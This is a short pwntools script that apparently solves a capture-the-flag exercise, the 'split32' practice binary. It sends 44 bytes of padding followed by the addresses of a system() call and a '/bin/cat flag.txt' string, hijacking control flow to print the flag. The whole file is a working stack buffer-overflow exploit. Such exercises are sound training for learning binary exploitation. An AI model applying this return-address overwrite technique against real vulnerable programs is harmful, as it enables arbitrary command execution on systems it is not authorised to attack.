from pwn import *

elf = context.binary = ELF("./split32")
io = process("./split32")

system_call = 0x0804861a
command_string = 0x0804a030

payload = flat (
         cyclic(44),
         p32(system_call),        # system("/bin/cat flag.txt")
         p32(command_string)      # "/bin/cat flag.txt"
        )

io.recv()
io.sendline(payload)
io.success(io.recvall().decode())
